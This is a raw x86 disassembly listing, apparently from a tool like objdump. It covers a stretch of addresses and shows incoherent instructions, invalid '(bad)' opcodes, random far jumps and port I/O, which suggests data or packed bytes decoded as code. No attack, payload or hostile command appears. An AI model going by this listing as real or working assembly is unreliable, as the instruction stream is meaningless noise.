  41a7e3:	loopne 0x41a78e
  41a7e5:	sub    al,0x0
  41a7e7:	inc    ecx
  41a7e8:	scas   eax,DWORD PTR es:[edi]
  41a7e9:	sbb    BYTE PTR [ecx],dh
  41a7eb:	pop    edx
  41a7ec:	call   0x0:0x0
	...
  41a853:	add    BYTE PTR [eax],al
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x805327ca,al
  41a863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a864:	cwde   
  41a865:	lock and DWORD PTR ds:0xff0001,ebx
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	mov    DWORD PTR [ebx],ebx
  41a870:	sbb    BYTE PTR [ebp+0xa],ch
  41a873:	sub    eax,DWORD PTR [edi-0x1a01bdd9]
  41a879:	outs   dx,DWORD PTR ds:[esi]
  41a87a:	mov    eax,DWORD PTR [edx+0x3f46d010]
  41a880:	add    BYTE PTR [ebp-0x15b818a5],dl
  41a886:	pop    edi
  41a887:	arpl   WORD PTR [edi],cx
  41a889:	sti    
  41a88a:	or     DWORD PTR [ebx],esi
  41a88c:	inc    edx
  41a88d:	(bad)  [eax-0x70]
  41a890:	and    DWORD PTR [ecx-0x18f08423],0xd94c300f
  41a89a:	xchg   esp,eax
  41a89b:	xchg   edx,eax
  41a89c:	jnp    0x41a853
  41a89e:	push   ebp
  41a89f:	shl    DWORD PTR [esi-0x2],1
  41a8a2:	cdq    
  41a8a3:	repnz inc ebp
  41a8a5:	je     0x41a8fa
  41a8a7:	add    al,0xd4
  41a8a9:	aaa    
  41a8aa:	int3   
  41a8ab:	add    al,cl
  41a8ad:	adc    BYTE PTR [ecx],dh
  41a8af:	or     BYTE PTR [esi+0x39a48c11],ch
  41a8b5:	and    al,0xb1
  41a8b7:	dec    esp
  41a8b8:	pop    esp
  41a8b9:	inc    eax
  41a8ba:	pop    edi
  41a8bb:	push   esi
  41a8bc:	and    eax,0xe675263f
  41a8c1:	adc    BYTE PTR [edi+esi*8],ah
  41a8c4:	cmp    ch,BYTE PTR [ecx]
  41a8c6:	frstor [edx+0x4f]
  41a8c9:	test   eax,0x2c4ccaf9
  41a8ce:	test   BYTE PTR [ebx],ah
  41a8d0:	mov    edx,0x5b591609
  41a8d5:	sar    BYTE PTR [ecx+eax*1],0x4a
  41a8d9:	xor    DWORD PTR [esi+0x3c],ecx
  41a8dc:	in     al,0x63
  41a8de:	rcr    edi,1
  41a8e0:	pop    esp
  41a8e1:	ins    DWORD PTR es:[edi],dx
  41a8e2:	in     eax,dx
  41a8e3:	pop    es
  41a8e4:	not    BYTE PTR [eax-0x1d]
  41a8e7:	fnstsw WORD PTR [edx+0x21]
  41a8ea:	pop    esp
  41a8eb:	xchg   bl,dh
  41a8ed:	dec    edi
  41a8ee:	or     bh,bh
  41a8f0:	cdq    
  41a8f1:	jg     0x41a88e
  41a8f3:	adc    esp,DWORD PTR [ecx]
  41a8f5:	adc    DWORD PTR [esp+ebx*2-0x137de805],ecx
  41a8fc:	sbb    BYTE PTR ds:0x5091e25a,dh
  41a902:	in     eax,dx
  41a903:	pop    ss
  41a904:	js     0x41a8dd
  41a906:	mul    BYTE PTR ds:0x5bf1cc46
  41a90c:	loopne 0x41a987
  41a90e:	cmp    BYTE PTR [ebx],al
  41a910:	cld    
  41a911:	push   esp
  41a912:	and    bh,BYTE PTR ss:[ebx-0x858b6b6]
  41a919:	int3   
  41a91a:	lahf   
  41a91b:	popa   
  41a91c:	inc    esi
  41a91d:	outs   dx,DWORD PTR ds:[esi]
  41a91e:	pop    eax
  41a91f:	retf   
  41a920:	push   bx
  41a922:	not    BYTE PTR [eax-0x1f]
  41a925:	popf   
  41a926:	adc    dl,BYTE PTR [ebx]
  41a928:	jne    0x41a992
  41a92a:	jno    0x41a925
  41a92c:	sahf   
  41a92d:	into   
  41a92e:	or     BYTE PTR [esp+ecx*8],ah
  41a931:	jg     0x41a93f
  41a933:	test   eax,0xc5d433d7
  41a938:	imul   edi,DWORD PTR [ebx+0x50],0x61
  41a93c:	repz add bl,al
  41a93f:	ins    BYTE PTR es:[edi],dx
  41a940:	outs   dx,DWORD PTR ds:[esi]
  41a941:	je     0x41a965
  41a943:	mov    bh,dh
  41a945:	sbb    dl,al
  41a947:	out    dx,al
  41a948:	in     al,0xb4
  41a94a:	test   BYTE PTR [eax+0x5e2ddc8a],al
  41a950:	push   eax
  41a951:	cli    
  41a952:	dec    ecx
  41a953:	pop    ds
  41a954:	mov    ecx,0xf65e0a9e
  41a959:	inc    ecx
  41a95a:	and    BYTE PTR [edi+0x77788c26],dh
  41a960:	arpl   WORD PTR [ebp-0x6f],bx
  41a963:	dec    esp
  41a964:	jo     0x41a902
  41a966:	pop    edi
  41a967:	dec    edi
  41a968:	sbb    BYTE PTR [ecx],cl
  41a96a:	sub    edi,0x11
	...
  41a9d5:	add    BYTE PTR ds:0xcf4a867e,dh
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e3:	ja     0x41a97e
  41a9e5:	out    0x20,eax
  41a9e7:	push   ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	inc    DWORD PTR [eax]
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	or     dl,BYTE PTR [edi-0x3af71954]
  41a9f4:	retf   
  41a9f5:	imul   edx,DWORD PTR [edx],0x590ec744
  41a9fb:	aaa    
  41a9fc:	jb     0x41a999
  41a9fe:	mov    ebp,0xa15b9acd
  41aa03:	enter  0x438c,0xb7
  41aa07:	test   eax,0x6157baa3
  41aa0c:	aam    0x27
  41aa0e:	xchg   ecx,eax
  41aa0f:	clc    
  41aa10:	dec    ecx
  41aa11:	xor    eax,0xe587e712
  41aa16:	sbb    BYTE PTR [edx-0x7337a030],ah
  41aa1c:	or     eax,0xc0353d00
  41aa21:	mov    ds:0x4dcde69f,al
  41aa26:	pop    ecx
  41aa27:	lfs    esi,FWORD PTR [edx-0x2c]
  41aa2b:	and    bh,dl
  41aa2d:	jns    0x41aa7a
  41aa2f:	iret   
  41aa30:	inc    ebx
  41aa31:	pop    ss
  41aa32:	pusha  
  41aa33:	mov    ah,0x41
  41aa35:	adc    BYTE PTR [ebx-0x45],ch
  41aa38:	mov    bl,BYTE PTR [ebp+0x11]
  41aa3b:	pop    ebp
  41aa3c:	fimul  WORD PTR [esi]
  41aa3e:	mov    edx,0x780429c9
  41aa43:	stc    
  41aa44:	mov    ss,WORD PTR [edx-0x34]
  41aa47:	imul   edx,DWORD PTR [ebp+0x4d],0x8aca218
  41aa4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4f:	xor    al,0x86
  41aa51:	jne    0x41aa67
  41aa53:	and    eax,0xf6df0f25
  41aa58:	xor    DWORD PTR [edx-0x23],edi
  41aa5b:	int3   
  41aa5c:	dec    esi
  41aa5d:	or     al,BYTE PTR [esi-0x69]
  41aa60:	jmp    0xea0074c5
  41aa65:	pop    ds
  41aa66:	adc    ch,BYTE PTR [ebp+0x74444b06]
  41aa6c:	lds    ecx,FWORD PTR [ecx]
  41aa6e:	jmp    0x34f917eb
  41aa73:	fwait
  41aa74:	pop    eax
  41aa75:	jae    0x41aad3
  41aa77:	iret   
  41aa78:	mov    WORD PTR [ecx-0x2b],ds
  41aa7b:	push   cs
  41aa7c:	jns    0x41aaf5
  41aa7e:	ret    0xf861
  41aa81:	lar    eax,WORD PTR [ebx+0x2b3ef6b4]
  41aa88:	popf   
  41aa89:	loopne 0x41aa6f
  41aa8b:	mov    DWORD PTR [esi+0x43],edi
  41aa8e:	pop    eax
  41aa8f:	shl    bl,1
  41aa91:	xchg   esp,eax
  41aa92:	mov    DWORD PTR [ecx-0x6a],eax
  41aa95:	sbb    al,0x79
  41aa97:	mov    edx,0xf9f01db2
  41aa9c:	out    0xb7,eax
  41aa9e:	mov    WORD PTR [ebp+edi*8-0x46],fs
  41aaa2:	cli    
  41aaa3:	fbld   TBYTE PTR [eax+0x69]
  41aaa6:	sahf   
  41aaa7:	fs sub eax,0xd852651b
  41aaad:	leave  
  41aaae:	jg     0x41aa9c
  41aab0:	rcl    BYTE PTR [eax+0x52],0x76
  41aab4:	aad    0x0
  41aab6:	jge    0x41ab36
  41aab8:	test   al,0xfa
  41aaba:	leave  
  41aabb:	sub    dh,BYTE PTR [ebx+edi*8-0x69]
  41aabf:	push   0xffffff9d
  41aac1:	mov    ss,WORD PTR [eax-0x1089d6a8]
  41aac7:	inc    ecx
  41aac8:	add    eax,0x84cae7d0
  41aacd:	or     DWORD PTR [eax],edi
  41aacf:	and    bl,dh
  41aad1:	jns    0x41ab17
  41aad3:	pushf  
  41aad4:	mov    esi,0xee95bc54
  41aad9:	rcl    DWORD PTR [ecx],0x6c
  41aadc:	ja     0x41ab05
  41aade:	sub    BYTE PTR [edi],0xdb
  41aae1:	xor    eax,0xbc334456
  41aae6:	fcomp  QWORD PTR [eax-0x3b]
  41aae9:	jmp    0x41ab11
  41aaeb:	adc    eax,0x9c
	...
  41ab54:	add    BYTE PTR [eax],al
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	arpl   bp,di
  41ab64:	(bad)  
  41ab65:	adc    ebx,DWORD PTR [edi]
  41ab67:	pop    ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	inc    DWORD PTR [eax]
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	jl     0x41ab33
  41ab70:	int3   
  41ab71:	sub    esp,DWORD PTR [ebx]
  41ab73:	popf   
  41ab74:	mov    al,0xab
  41ab76:	mov    ecx,DWORD PTR [ebp+eax*1+0x5d3ebc88]
  41ab7d:	dec    edi
  41ab7e:	or     DWORD PTR [ecx],eax
  41ab80:	inc    edi
  41ab81:	push   cs
  41ab82:	scas   al,BYTE PTR es:[edi]
  41ab83:	pop    ebx
  41ab84:	retf   
  41ab85:	scas   eax,DWORD PTR es:[edi]
  41ab86:	jnp    0x41abfc
  41ab88:	mov    cl,0x57
  41ab8a:	out    0x8d,eax
  41ab8c:	sahf   
  41ab8d:	add    dh,dh
  41ab8f:	xchg   edi,eax
  41ab90:	add    eax,0xb4c9e7c4
  41ab95:	xchg   edi,eax
  41ab96:	shl    BYTE PTR [esi],cl
  41ab98:	out    dx,al
  41ab99:	retf   
  41ab9a:	dec    esi
  41ab9b:	xor    esp,DWORD PTR [esp+esi*1-0x5c4471e4]
  41aba2:	jl     0x41ab6f
  41aba4:	in     al,dx
  41aba5:	cmp    al,0x16
  41aba7:	call   0xba43:0x41f47788
  41abae:	js     0x41ac1d
  41abb0:	adc    bl,BYTE PTR [esp+edx*1]
  41abb3:	mov    ecx,ecx
  41abb5:	test   eax,0xa38a161b
  41abba:	icebp  
  41abbb:	mov    esp,DWORD PTR [ecx]
  41abbd:	repz pushf 
  41abbf:	ss xchg edx,eax
  41abc1:	xchg   DWORD PTR [edi+esi*4+0x60a2546a],ebp
  41abc8:	jmp    0x41ab89
  41abca:	loope  0x41abb7
  41abcc:	je     0x41abdd
  41abce:	mov    BYTE PTR [esi],cl
  41abd0:	sub    eax,0x7b78126
  41abd5:	and    edx,edi
  41abd7:	sbb    dl,BYTE PTR ds:0x78330223
  41abdd:	loopne 0x41abd1
  41abdf:	cld    
  41abe0:	add    ebx,DWORD PTR [ecx-0x68d13c80]
  41abe6:	push   0x42b90848
  41abeb:	add    edx,edx
  41abed:	push   cs
  41abee:	sbb    DWORD PTR [esi+0x1c],eax
  41abf1:	fmul   DWORD PTR [ebp-0x35]
  41abf4:	xor    di,WORD PTR [edi+0x42]
  41abf8:	mov    dl,0xa2
  41abfa:	inc    edx
  41abfb:	push   eax
  41abfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abfd:	sub    ch,BYTE PTR [ebx]
  41abff:	(bad)  
  41ac00:	push   eax
  41ac01:	and    cl,BYTE PTR [edx-0x3432ecc]
  41ac07:	cdq    
  41ac08:	jge    0x41ab9a
  41ac0a:	mov    BYTE PTR [esi],ah
  41ac0c:	ins    BYTE PTR es:[edi],dx
  41ac0d:	adc    esi,DWORD PTR [ebx+0x6d68cf5e]
  41ac13:	ret    0x6444
  41ac16:	sbb    DWORD PTR [ecx+0x4a],edx
  41ac19:	inc    BYTE PTR [ebx+0x2c]
  41ac1c:	rcl    bh,1
  41ac1e:	and    BYTE PTR [ecx],bl
  41ac20:	popa   
  41ac21:	(bad)  [ebp+0x50]
  41ac24:	xchg   edi,eax
  41ac25:	out    dx,al
  41ac26:	add    al,0xfa
  41ac28:	into   
  41ac29:	push   0x7e
  41ac2b:	cmc    
  41ac2c:	(bad)  
  41ac2d:	adc    al,0x8c
  41ac2f:	jl     0x41ac8e
  41ac31:	jmp    0xa02:0x19abe026
  41ac38:	push   esp
  41ac39:	or     bl,BYTE PTR [edi]
  41ac3b:	je     0x41ac40
  41ac3d:	mov    dh,0x8d
  41ac3f:	retf   0xf3ca
  41ac42:	out    0x81,eax
  41ac44:	jmp    0x8faf:0x7ef47a80
  41ac4b:	fstp   TBYTE PTR [edx+0x3e]
  41ac4e:	sbb    cl,bl
  41ac50:	not    DWORD PTR ss:[ecx-0x5c]
  41ac54:	or     edx,edx
  41ac56:	jb     0x41abef
  41ac58:	pop    edi
  41ac59:	inc    ebx
  41ac5a:	inc    eax
  41ac5b:	push   ebp
  41ac5c:	bound  eax,QWORD PTR [esi-0x5d11d2c9]
  41ac62:	mov    ah,0x97
  41ac64:	into   
  41ac65:	rol    BYTE PTR [eax+0x29],0xa7
  41ac69:	dec    edx
  41ac6a:	pop    edx
  41ac6b:	(bad)  
	...
  41acd5:	add    BYTE PTR [edx+0x49],ch
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [edx+eax*8-0x24]
  41ace4:	rcr    DWORD PTR [ebx],0x1e
  41ace7:	and    BYTE PTR [ecx],al
  41ace9:	add    bh,bh
  41aceb:	add    BYTE PTR [eax],al
  41aced:	add    ah,dh
  41acef:	mov    bl,0xa8
  41acf1:	ins    DWORD PTR es:[edi],dx
  41acf2:	nop
  41acf3:	sbb    eax,0x3cc4b79c
  41acf8:	ds jle 0x41acff
  41acfb:	mov    BYTE PTR [eax],cl
  41acfd:	lds    esp,FWORD PTR [ebx+edx*4-0x15989e7b]
  41ad04:	arpl   WORD PTR [edx+ecx*1+0xf],dx
  41ad08:	adc    BYTE PTR [esi],dh
  41ad0a:	es cmc 
  41ad0c:	ss pop ds
  41ad0e:	mov    ds:0x38f7e572,eax
  41ad13:	or     eax,0x2d284d77
  41ad18:	mov    ?,WORD PTR gs:[esi-0x5b]
  41ad1c:	nop
  41ad1d:	in     al,0x47
  41ad1f:	bound  esp,QWORD PTR [eax]
  41ad21:	in     al,dx
  41ad22:	mov    ds:0x439ddc96,eax
  41ad27:	add    dl,BYTE PTR [ebp-0x4bef803b]
  41ad2d:	jle    0x41ad52
  41ad2f:	out    dx,al
  41ad30:	sbb    al,0x5a
  41ad32:	adc    bl,bl
  41ad34:	out    0x15,eax
  41ad36:	sahf   
  41ad37:	mov    ds:0x3f1e8966,eax
  41ad3c:	inc    esi
  41ad3d:	sar    DWORD PTR ds:0x7ea66a97,cl
  41ad43:	inc    edi
  41ad44:	fwait
  41ad45:	sub    BYTE PTR [ecx],0xf3
  41ad48:	stos   BYTE PTR es:[edi],al
  41ad49:	mov    ah,0x7a
  41ad4b:	push   ebp
  41ad4c:	inc    ebx
  41ad4d:	lods   al,BYTE PTR ds:[esi]
  41ad4e:	push   edx
  41ad4f:	(bad)  [esi]
  41ad51:	mov    esp,0xfd9f790c
  41ad56:	out    dx,eax
  41ad57:	xchg   esi,eax
  41ad58:	mov    dh,0x4c
  41ad5a:	lock (bad) 
  41ad5c:	call   0x1c98:0x8fb1a441
  41ad63:	(bad)  
  41ad64:	daa    
  41ad65:	popa   
  41ad66:	out    0xa4,al
  41ad68:	mov    bh,0x81
  41ad6a:	cmp    al,0xf1
  41ad6c:	inc    ebx
  41ad6d:	fst    QWORD PTR [ebx+0x67]
  41ad70:	bound  ebx,QWORD PTR [edx-0x44ae12cc]
  41ad76:	mov    ebp,0x8f631716
  41ad7b:	lock mov ds:0x4a4f18b4,al
  41ad81:	fidiv  DWORD PTR [edi-0x54]
  41ad84:	pop    ebp
  41ad85:	sahf   
  41ad86:	push   esi
  41ad87:	ret    0x8992
  41ad8a:	inc    ebp
  41ad8b:	ret    0x5f81
  41ad8e:	addr16 aam 0xc4
  41ad91:	out    0x9d,eax
  41ad93:	cmp    eax,0x449d2a1c
  41ad98:	push   edi
  41ad99:	push   ds
  41ad9a:	xchg   ebp,eax
  41ad9b:	das    
  41ad9c:	mov    BYTE PTR [eax-0x6e],bh
  41ad9f:	dec    ebx
  41ada0:	sti    
  41ada1:	in     al,dx
  41ada2:	bound  eax,QWORD PTR [edi]
  41ada4:	aas    
  41ada5:	add    al,0x45
  41ada7:	add    BYTE PTR [edi],bl
  41ada9:	xor    dl,BYTE PTR [ecx]
  41adab:	imul   edi,DWORD PTR [esi+ecx*2-0x1f],0x7e5df10d
  41adb3:	in     eax,dx
  41adb4:	out    dx,al
  41adb5:	mov    ds:0xa90d92a,eax
  41adba:	xchg   esi,eax
  41adbb:	lods   eax,DWORD PTR ds:[esi]
  41adbc:	es mov bl,0xf4
  41adbf:	xchg   ebp,eax
  41adc0:	mov    bl,0xea
  41adc2:	mov    ds:0xa3472ae7,al
  41adc7:	int    0x87
  41adc9:	cmp    cl,0x94
  41adcc:	sub    edi,edx
  41adce:	xor    al,0x8
  41add0:	xchg   ecx,eax
  41add1:	push   edi
  41add2:	pop    ebp
  41add3:	xchg   BYTE PTR ds:0xadc346ef,dh
  41add9:	pop    ebx
  41adda:	adc    cl,BYTE PTR [ebx]
  41addc:	push   0xd67f5bdf
  41ade1:	jo     0x41ad7e
  41ade3:	and    BYTE PTR [ebx+0x1a47a3af],cl
  41ade9:	fimul  WORD PTR [esi]
  41adeb:	xchg   esi,edx
	...
  41ae55:	add    BYTE PTR [ebp-0x8],dl
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [esi+ebx*1+0x1d2275f3],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    bh,bh
  41ae6b:	add    BYTE PTR [eax],al
  41ae6d:	add    BYTE PTR [esi],al
  41ae6f:	adc    al,0xfe
  41ae71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae72:	enter  0xa34c,0x7e
  41ae76:	jb     0x41aeaf
  41ae78:	cmp    ah,BYTE PTR [eax-0x70]
  41ae7b:	mov    al,ds:0xb378bb2d
  41ae80:	fnstsw WORD PTR [edi+0x71250f5d]
  41ae86:	imul   ebp,DWORD PTR [esi+0x6c],0xffffffe0
  41ae8a:	jp     0x41aead
  41ae8c:	pop    esi
  41ae8d:	sub    ah,BYTE PTR [eax-0x2ef7ee6c]
  41ae93:	pop    ebx
  41ae94:	loope  0x41aeee
  41ae96:	or     cl,BYTE PTR [edi-0x9]
  41ae99:	retf   
  41ae9a:	mov    bh,0x69
  41ae9c:	imul   edi,DWORD PTR [esi],0x50a912ec
  41aea2:	pop    esi
  41aea3:	fxch   st(2)
  41aea5:	dec    ebp
  41aea6:	data16 fsub DWORD PTR [edi-0x2f]
  41aeaa:	ror    esi,1
  41aeac:	mov    eax,0xac4db789
  41aeb1:	adc    dl,bh
  41aeb3:	pop    ds
  41aeb4:	mov    ds:0x12e8849a,eax
  41aeb9:	adc    eax,0x52c12ae8
  41aebe:	not    DWORD PTR [edx+0x74]
  41aec1:	lock and eax,0x2af85808
  41aec7:	and    ah,0x5b
  41aeca:	ret    0x4adb
  41aecd:	imul   eax,DWORD PTR [edi-0x18],0x19ed2bf9
  41aed4:	push   0xc7a1e585
  41aed9:	sub    al,0xbb
  41aedb:	and    al,0x51
  41aedd:	les    esi,FWORD PTR [ebx-0x9]
  41aee0:	add    BYTE PTR [ebp-0x24],bl
  41aee3:	bnd call 0x83f8fb2
  41aee9:	mov    bl,dl
  41aeeb:	sbb    eax,0xec9582e2
  41aef0:	in     eax,dx
  41aef1:	inc    esi
  41aef2:	fs add dl,ch
  41aef5:	rol    DWORD PTR [ebp-0x54d284a6],0xdb
  41aefc:	jo     0x41aebc
  41aefe:	mov    ah,0x4d
  41af00:	sub    al,BYTE PTR [ecx-0x5bfa3122]
  41af06:	or     ebp,DWORD PTR [ebx+0x11]
  41af09:	inc    esi
  41af0a:	add    ebx,edi
  41af0c:	loopne 0x41aeed
  41af0e:	scas   eax,DWORD PTR es:[edi]
  41af0f:	stos   BYTE PTR es:[edi],al
  41af10:	into   
  41af11:	aas    
  41af12:	aam    0x25
  41af14:	jmp    0x800195de
  41af19:	and    DWORD PTR [ebx+0xe],edi
  41af1c:	scas   al,BYTE PTR es:[edi]
  41af1d:	fsub   DWORD PTR [ebp-0x20c6ccf0]
  41af23:	ror    BYTE PTR [edi-0x5e],1
  41af26:	out    dx,eax
  41af27:	pop    ss
  41af28:	xchg   edx,eax
  41af29:	scas   eax,DWORD PTR es:[edi]
  41af2a:	fld    DWORD PTR [esi]
  41af2c:	sbb    edx,DWORD PTR [ecx+0x3fbbdafd]
  41af32:	or     cl,BYTE PTR [eax+0x5c]
  41af35:	int    0xce
  41af37:	imul   ecx,DWORD PTR ds:0xc6c03fde,0x50dfe8e9
  41af41:	sbb    al,0xcd
  41af43:	push   esp
  41af44:	fstp   DWORD PTR [eax]
  41af46:	mov    esp,0xe62319d0
  41af4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af4c:	dec    edx
  41af4d:	imul   esp,DWORD PTR [edx+0x45],0xacfd0f55
  41af54:	xchg   ebp,eax
  41af55:	adc    al,0xe5
  41af57:	jbe    0x41afbe
  41af59:	jp     0x41af57
  41af5b:	(bad)  
  41af5c:	cwde   
  41af5d:	fnstsw WORD PTR [edi+0x14]
  41af60:	mov    ebx,0xfc6f30f
  41af65:	test   al,0xc2
  41af67:	dec    eax
  41af68:	mov    al,0xfa
  41af6a:	int3   
  41af6b:	xchg   DWORD PTR [edi+0x0],eax
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0xc6d344ee
  41afe4:	in     al,0x37
  41afe6:	sbb    al,0x22
  41afe8:	add    DWORD PTR [eax],eax
  41afea:	inc    DWORD PTR [eax]
  41afec:	add    BYTE PTR [eax],al
  41afee:	sbb    DWORD PTR [esi],0xfffffff5
  41aff1:	add    DWORD PTR [ecx+esi*1],esp
  41aff4:	adc    BYTE PTR ds:0x270e95a6,ch
  41affa:	push   es
  41affb:	into   
  41affc:	imul   esi,ecx,0x20
  41afff:	pop    ecx
  41b000:	or     dl,BYTE PTR [eax+0x35]
  41b003:	lock jb 0x41af8e
  41b006:	and    al,0x49
  41b008:	and    dh,cl
  41b00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b00b:	ja     0x41b02a
  41b00d:	sbb    esi,edi
  41b00f:	test   BYTE PTR [ebp+esi*1+0x5c],al
  41b013:	ds neg dl
  41b016:	push   ecx
  41b017:	jo     0x41b040
  41b019:	mov    dh,BYTE PTR [eax+0x10]
  41b01c:	jl     0x41b094
  41b01e:	popa   
  41b01f:	ss or  dl,ch
  41b022:	sti    
  41b023:	xchg   edx,eax
  41b024:	sub    eax,0x35586162
  41b029:	dec    edx
  41b02a:	mov    gs,esi
  41b02c:	lea    ebx,[esi-0x78]
  41b02f:	(bad)  
  41b030:	mov    edi,0x63370ceb
  41b035:	sbb    eax,0x6e93e9e3
  41b03a:	arpl   WORD PTR [esp+ebx*8],dx
  41b03d:	pop    ebx
  41b03e:	push   esi
  41b03f:	mov    cl,0x97
  41b041:	fwait
  41b042:	and    DWORD PTR [ebp+0x5e],eax
  41b045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b046:	mov    bl,0x84
  41b048:	sub    DWORD PTR [edx-0x41],ecx
  41b04b:	cmp    al,0x3
  41b04d:	dec    BYTE PTR [esi+0x13]
  41b050:	shr    DWORD PTR [ebx+eiz*2+0x5b205baf],cl
  41b057:	out    0x27,eax
  41b059:	ror    DWORD PTR [ebp+0x18820eb7],0x3
  41b060:	aam    0x1a
  41b062:	rol    DWORD PTR [ecx-0x3c],0xcc
  41b066:	call   0xa833:0x4e159311
  41b06d:	mov    bl,0x43
  41b06f:	imul   ebp,ecx,0xb71f419b
  41b075:	mov    edx,0x68665f18
  41b07a:	adc    DWORD PTR [ecx+0x3386b76b],eax
  41b080:	pop    esp
  41b081:	or     ch,ah
  41b083:	stos   DWORD PTR es:[edi],eax
  41b084:	dec    esi
  41b085:	mov    esi,DWORD PTR [ecx+0x37]
  41b088:	stos   DWORD PTR es:[edi],eax
  41b089:	outs   dx,BYTE PTR ds:[esi]
  41b08a:	push   esi
  41b08b:	add    bh,BYTE PTR [eax-0x7bae29ab]
  41b091:	jbe    0x41b0b1
  41b093:	cmp    ah,ch
  41b095:	inc    esi
  41b096:	jg     0x41b086
  41b098:	popa   
  41b099:	in     eax,0x61
  41b09b:	rol    DWORD PTR [ebx+edx*2],1
  41b09e:	mov    ebx,0x21431ea3
  41b0a3:	lea    ebx,ss:[eax+0x68]
  41b0a7:	jno    0x41b055
  41b0a9:	fstp   QWORD PTR [ecx-0x70]
  41b0ac:	push   ds
  41b0ad:	outs   dx,DWORD PTR ds:[esi]
  41b0ae:	mov    dl,0x96
  41b0b0:	xchg   esp,eax
  41b0b1:	adc    BYTE PTR [ecx],dl
  41b0b3:	imul   esp,DWORD PTR ds:0xfba6cdd4,0x31
  41b0ba:	outs   dx,DWORD PTR ds:[esi]
  41b0bb:	lea    edx,[ecx-0x63999fe7]
  41b0c1:	xor    DWORD PTR [ebx],ebp
  41b0c3:	stos   DWORD PTR es:[edi],eax
  41b0c4:	jnp    0x41b13b
  41b0c6:	push   edi
  41b0c7:	mov    ebp,eax
  41b0c9:	shl    DWORD PTR [eax],cl
  41b0cb:	jle    0x41b094
  41b0cd:	mov    ah,0x8c
  41b0cf:	test   al,0xa0
  41b0d1:	addr16 leave 
  41b0d3:	hlt    
  41b0d4:	xchg   edi,eax
  41b0d5:	int3   
  41b0d6:	mov    al,0x8f
  41b0d8:	jecxz  0x41b12d
  41b0da:	and    dh,BYTE PTR [ecx+0x7e7436f7]
  41b0e0:	(bad)  
  41b0e1:	or     dh,BYTE PTR [esp+eiz*8-0x2f]
  41b0e5:	in     eax,0x3e
  41b0e7:	outs   dx,DWORD PTR ds:[esi]
  41b0e8:	setbe  ah
  41b0eb:	fisub  WORD PTR [ebx+0x0]
	...
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0xb008ed21
  41b166:	sbb    esp,DWORD PTR [ebx]
  41b168:	add    DWORD PTR [eax],eax
  41b16a:	inc    DWORD PTR [eax]
  41b16c:	add    BYTE PTR [eax],al
  41b16e:	mov    ebp,0xe3816c85
  41b173:	sub    eax,0xf523fe4c
  41b178:	push   edi
  41b179:	jo     0x41b1e9
  41b17b:	jo     0x41b105
  41b17d:	push   edi
  41b17e:	cmp    edx,esi
  41b180:	shr    DWORD PTR [esi-0x17],cl
  41b183:	jb     0x41b146
  41b185:	jecxz  0x41b15c
  41b187:	mov    edi,0x38bee440
  41b18c:	ss out dx,al
  41b18e:	rcr    DWORD PTR [ebx*8-0x2ea2ebc5],cl
  41b195:	push   edi
  41b196:	lea    ebp,[eax]
  41b198:	jle    0x41b15d
  41b19a:	and    bh,bh
  41b19c:	pop    ss
  41b19d:	sub    eax,0xf6050746
  41b1a2:	and    BYTE PTR [edx+0x2c],cl
  41b1a5:	outs   dx,DWORD PTR ds:[esi]
  41b1a6:	mov    al,0x8c
  41b1a8:	ret    0xc236
  41b1ab:	fadd   QWORD PTR [edx]
  41b1ad:	pop    edx
  41b1ae:	lods   al,BYTE PTR ds:[esi]
  41b1af:	add    al,0xdc
  41b1b1:	adc    bh,al
  41b1b3:	mov    DWORD PTR gs:[ecx-0x516b2483],ebp
  41b1ba:	fisttp WORD PTR [esi-0x5f]
  41b1bd:	xchg   ecx,eax
  41b1be:	push   edx
  41b1bf:	iret   
  41b1c0:	mov    dl,0xf3
  41b1c2:	push   0xffffffdf
  41b1c4:	pop    ss
  41b1c5:	in     al,dx
  41b1c6:	jle    0x41b224
  41b1c8:	adc    al,0x48
  41b1ca:	add    DWORD PTR [edi+0x49],0xfffffffc
  41b1ce:	dec    edi
  41b1cf:	or     al,0x87
  41b1d1:	and    al,0xe6
  41b1d3:	dec    ecx
  41b1d4:	pop    esp
  41b1d5:	shr    DWORD PTR [edx],cl
  41b1d7:	mov    esp,0x2d7ee0c9
  41b1dc:	in     eax,dx
  41b1dd:	frstor [ecx+0x77]
  41b1e0:	jno    0x41b1ec
  41b1e2:	xchg   ebp,eax
  41b1e4:	jb     0x41b1c2
  41b1e6:	fld    TBYTE PTR [ebx-0x5ad50ad6]
  41b1ec:	cmp    eax,0xd7e35024
  41b1f1:	in     al,0xa0
